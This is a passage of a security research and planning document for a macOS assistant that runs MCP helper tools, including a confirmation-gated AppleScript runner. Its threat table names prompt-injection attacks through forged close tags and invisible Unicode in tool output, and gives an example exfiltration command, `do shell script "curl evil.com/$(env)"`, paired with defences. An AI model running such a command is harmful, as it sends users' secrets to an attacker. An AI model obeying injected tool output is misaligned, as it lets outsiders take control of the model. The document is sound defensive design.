| V2 Authentication | no | Single-user personal; no authentication surface introduced by MCP |
| V3 Session Management | no | No sessions |
| V4 Access Control | **yes** | Per-helper TCC identity (MCP-05); `run_applescript` confirmation gate (MCP-04); tool blocklist (SEC-05 launch-pinned) |
| V5 Input Validation | **yes** | Sanitize pipeline (SEC-07); tool argument schemas validated by SDK on the helper side; `get_clipboard` refuses fileURL (MCP-03) |
| V6 Cryptography | no | No cryptographic operations introduced by MCP (Keychain for API keys is P1-02) |

### Known Threat Patterns for swift-sdk + NSAppleScript + NSPasteboard

| Pattern | STRIDE | Standard Mitigation |
|---------|--------|---------------------|
| Prompt injection via tool output containing `</UNTRUSTED_CONTENT>...` close-tag forgery | Tampering / Elevation of Privilege | Per-turn nonce in wrap tags; nonce never crosses to webview (SEC-06); pre-strip tag-like substrings before wrap |
| Prompt injection via bidi/zero-width Unicode in tool output | Tampering | Strip bidi (U+202A..E, U+2066..9) and zero-width (U+200B..D, U+2060, U+FEFF) in `sanitize()` — SEC-07 |
| AppleScript exfiltration via `do shell script "curl evil.com/$(env)"` or similar | Information Disclosure / Tampering | Hard-coded native AppKit confirmation (MCP-04); no regex skip-allowlist (SEC-08); args masked pre-approval; every AppleScript runs through the broker |
| Clipboard file-URL exposed to model triggering unintended file access | Information Disclosure | `get_clipboard` refuses pasteboards with `NSPasteboardTypeFileURL` regardless of string content (MCP-03) |
| Helper crash leaves parent awaiting continuation forever (DoS) | Denial of Service | Per-server restart mutex + `MCPError.serverCrashed` drain on EOF (MCP-07); lazy restart on next call |
| Parent FDs leak into helper child (SQLite WAL, replay log) | Information Disclosure | Every FD opened with `O_CLOEXEC`; `ChildSpawnGate` pre-spawn sweep as belt-and-braces; debug assertion on uncloexec FD (MCP-08) |
| Helper inherits parent env carrying secrets (ANTHROPIC_API_KEY, etc.) | Information Disclosure | `ChildSpawnGate` sets `process.environment = ["PATH": "/usr/bin:/bin"]` explicitly; no env inheritance |
| Xcode "Code Sign On Copy" strips per-helper entitlements at link time | Elevation of Privilege | `scripts/verify-codesign-settings.sh` lints pbxproj for `CodeSignOnCopy = YES` (already landed P1-05) |
| Confirmation sheet rendered in webview (forgeable by tool-output XSS) | Tampering / Elevation of Privilege | Native AppKit sheet on hidden `NSPanel`; lint ban on `runModal` / `beginModalSession` / `NSApplication.run` across ALL `@MainActor` presentation paths (MCP-04 + AUDIT-R4-Sec4) |
| Late/duplicate confirmation-broker transitions race with voice barge-in | Tampering | FSM with `outcome` field set-once; late transitions explicit no-op; first outcome wins (MCP-09) |

## Phase Requirements

| ID | Description | Research Support |
|----|-------------|------------------|
| AGENT-11 | 60s timeout on confirmation `broker.response(id)` await; timed-out = synthetic deny + log | Pattern 5 ConfirmationBroker includes a `Task { try? await Task.sleep(for: .seconds(60)); await self.response(id, .timeout) }` timer; outcome is `.timeout` (logged), caller interprets as deny |
| MCP-01 | MCP client uses official `modelcontextprotocol/swift-sdk v0.12.0` | Standard Stack table pins v0.12.0 (verified 2026-04-22 via GitHub API); Pattern 1 spawn-and-wire covers live integration; Package.swift source-verified to require `swift-tools-version:6.1` + macOS 13.0 platform |
| MCP-02 | `get_time` returns current time invocable by agent | Pattern 6 helper structure + Code Example `mcp-time/main.swift` `ISO8601DateFormatter().string(from: Date())` in CallTool handler |
| MCP-03 | `get_clipboard` refuses pasteboards with `NSPasteboardTypeFileURL` | Pattern 7 example guards on `pb.types.contains(.fileURL)` before `pb.string(forType: .string)` |
| MCP-04 | `run_applescript` gated behind native-AppKit confirmation sheet on hidden NSPanel; `ToolCallStart.args` serialized as `{awaitingApproval: true}` pre-approval | Pattern 5 ConfirmationBroker + Pattern 8 NSAppleScript execution; Code Example `dispatchToolCall` shows args-masking logic; anti-patterns list forbids `runModal` module-wide |
| MCP-07 | Per-server restart mutex; drain continuation map with `MCPError.serverCrashed` on EOF; lazy restart on next call; concurrent callers share one restart | Pattern 2 restart mutex with `handle.restartTask: Task<Void, Error>?` slot; SDK `Client.disconnect()` handles continuation drain at the SDK level (verified Client.swift); our layer wraps to `MCPError.serverCrashed` |
| MCP-08 | Child processes spawned via single `ChildSpawnGate` enforcing `FD_CLOEXEC` + minimal `PATH=/usr/bin:/bin` | Pattern 3 `ChildSpawnGate.prepare()` walks FDs via `getdtablesize()` + `fcntl(F_GETFD/F_SETFD, FD_CLOEXEC)`; Pitfall 8 documents the race and why `O_CLOEXEC`-at-open is the primary defense |
| MCP-09 | Confirmation broker has four legal transitions (`.timeout`, `.barge`, `.approve`, `.deny`); modals forbidden across all `@MainActor` presentation paths (lint-enforced); late-hop transitions no-op | Pattern 5 FSM; anti-patterns list cites AUDIT-R4-Sec4 module-wide widening |
| SEC-07 | Tool-result sanitize pipeline on every MCP-boundary byte stream: UTF-8 valid, strip C0 (except \t), strip bidi/zero-width, cap line length; runs BEFORE packing into `LLMMessage` | Pattern 4 `SanitizeForModel.prepare()` with fixed order sanitize → headTruncate → wrapUntrusted; Code Example `dispatchToolCall` shows call site in the turn loop |

Note: MCP-05 and MCP-06 were completed in P1-05 (codesign deepest-first walker + forbidden-entitlement grep + pbxproj lint). Phase 5 only needs to populate helpers under `Contents/Helpers/`; the existing scripts pick them up automatically.

## Sources

### Primary (HIGH confidence)

- **Context7** `/modelcontextprotocol/swift-sdk` — `Client`, `Server`, `StdioTransport`, `withMethodHandler(ListTools.self/CallTool.self)`, `ServiceGroup`, `Tool`, `MCPError` [retrieved 2026-04-22]
- [modelcontextprotocol/swift-sdk Package.swift @ 0.12.0](https://raw.githubusercontent.com/modelcontextprotocol/swift-sdk/0.12.0/Package.swift) — platform pins, dependencies, swift-tools-version
- [modelcontextprotocol/swift-sdk StdioTransport.swift @ 0.12.0](https://raw.githubusercontent.com/modelcontextprotocol/swift-sdk/0.12.0/Sources/MCP/Base/Transports/StdioTransport.swift) — `FileDescriptor` parameterization and default stdin/stdout behavior
- [modelcontextprotocol/swift-sdk Client.swift @ 0.12.0](https://raw.githubusercontent.com/modelcontextprotocol/swift-sdk/0.12.0/Sources/MCP/Client/Client.swift) — `connect`/`disconnect` pending-request drain semantics
- [modelcontextprotocol/swift-sdk releases](https://github.com/modelcontextprotocol/swift-sdk/releases) — v0.12.0 published 2026-03-24; latest stable
- [Apple TN2206 macOS Code Signing In Depth](https://developer.apple.com/library/archive/technotes/tn2206/_index.html) — `--deep` forbidden; deepest-first ordering
- [Apple NSAppleScript documentation](https://developer.apple.com/documentation/foundation/nsapplescript) — `executeAndReturnError(_:)` + `NSAppleScriptErrorNumber`/`Message` keys
- [Apple NSPasteboard documentation](https://developer.apple.com/documentation/appkit/nspasteboard) — `types` + `string(forType:)` + `canReadItem(withDataConformingToTypes:)`
- [Apple NSPasteboardTypeFileURL documentation](https://developer.apple.com/documentation/appkit/nspasteboardtypefileurl) — `.fileURL` is the Swift name
- [Apple beginSheet(_:completionHandler:) documentation](https://developer.apple.com/documentation/appkit/nssavepanel/1535870-beginsheetmodal) — non-blocking sheet API
- [Apple forums — Can you pipe process output on a non-standard stream?](https://forums.swift.org/t/can-you-pipe-process-output-on-a-non-standard-stream/71224) — Pipe FD → FileDescriptor recipe
- `scripts/codesign.sh` (repo-local, landed in P1-05 commit e9a0bb1) — deepest-first walker, PlugIns xctest handling
- `scripts/verify-entitlements.sh` (P1-05 commit 52f2bde/faf0004) — pre- and post-codesign grep gates including per-helper apple-events enforcement
- `scripts/verify-codesign-settings.sh` (P1-05) — pbxproj linter forbidding `--deep` and `CodeSignOnCopy = YES`
- `.planning/research/ARCHITECTURE.md` — component responsibilities, data flow, anti-patterns, per-server restart mutex pattern
- `.planning/research/PITFALLS.md` — #3 nested codesign, #7 helper codesign ordering, #8 prompt injection, #10 MCP child crash continuation leak

### Secondary (MEDIUM confidence)

- [Creating MCP Servers in Swift (Artem Novichkov, 2026)](https://artemnovichkov.com/blog/creating-mcp-servers-in-swift) — single-helper Package.swift structure, `main.swift` pattern
- [Building a MCP Client in Swift: Part 2 (glacio.tech blog)](https://blog.glacio.tech/building-a-mcp-client-in-swift-a-step-by-step-guide-part-2) — parent-side `Process` + `Pipe` + `FileDescriptor(rawValue:)` recipe
- [peakmojo/applescript-mcp on GitHub](https://github.com/peakmojo/applescript-mcp) — reference AppleScript MCP helper (not Swift, but shape parity)
- [joshrutkowski/applescript-mcp on GitHub](https://github.com/joshrutkowski/applescript-mcp) — second reference AppleScript MCP helper
- [Executing AppleScript in a Mac app on macOS Mojave (Jesse Squires, 2018)](https://www.jessesquires.com/blog/2018/11/17/executing-applescript-in-mac-app-on-macos-mojave/) — entitlement requirements
- [Execute AppleScript with AppKit with Swift (Mac O'Clock, Medium)](https://medium.com/macoclock/everything-you-need-to-do-to-launch-an-applescript-from-appkit-on-macos-catalina-with-swift-1ba82537f7c3) — `NSAppleScript` usage pattern
- [CERT FIO22-C Close files before spawning processes](https://wiki.sei.cmu.edu/confluence/display/c/FIO22-C.+Close+files+before+spawning+processes) — rationale for FD_CLOEXEC
- [posix_spawn OpenGroup reference](https://pubs.opengroup.org/onlinepubs/007904975/functions/posix_spawn.html) — FD_CLOEXEC handling semantics
- [Ollama issues #14493, #14601, #14745, #15315](https://github.com/ollama/ollama/issues/14493) — Qwen3 tool-calling broken; `qwen2.5-coder:32b` is the baseline (RESEARCH-DELTAS D3)
- [SF-0037 Subprocess 1.0 review thread](https://forums.swift.org/t/review-sf-0037-subprocess-1-0/86004) — confirms `swift-subprocess` not yet 1.0 as of April 2026

### Tertiary (LOW confidence — cited inline and flagged)

- [Maccy/Clipboard.swift on GitHub](https://github.com/p0deje/Maccy/blob/master/Maccy/Clipboard.swift) — NSPasteboard type-inspection recipe (reference only; our refusal logic is simpler)
- [Invisible Character Viewer zero-width references](https://invisiblecharacterviewer.com/characters/zero-width-space) — enumeration of zero-width code points (validated against Unicode 15.1)

## Metadata

**Confidence breakdown:**
- Standard stack: HIGH — SDK v0.12.0 source-verified against our platform requirements (macOS 13.0+, Swift 6.1+); Foundation Process+Pipe is stdlib; scripts already exist
- Architecture: HIGH — four rounds of audit + ARCHITECTURE.md converged; ConfirmationBroker FSM and per-server restart mutex patterns are 2026-standard
- Pitfalls: HIGH — sourced from PITFALLS.md (audit-cross-referenced) plus two new pitfalls (StdioTransport-defaults-to-stdin, swift-tools-version-mismatch, Info.plist background flags, helper stdout corruption, Process.terminate doesn't escalate, App ID capability gap, helper binary path Debug/Archive drift, FD_CLOEXEC race window) discovered by source reading of SDK v0.12.0
- Security: HIGH — ASVS V4/V5 applicable; STRIDE mitigations all cross-reference REQs or AUDIT-R items
- Helper packaging: MEDIUM — xcodegen regeneration behavior for multi-target `.app` products with nested Copy Files phase is the one area most likely to need iteration during plan execution

**Research date:** 2026-04-22
**Valid until:** 2026-05-22 (30 days — SDK is stable; no known breaking changes expected; re-verify if SDK v0.13.0 ships before plan execution)
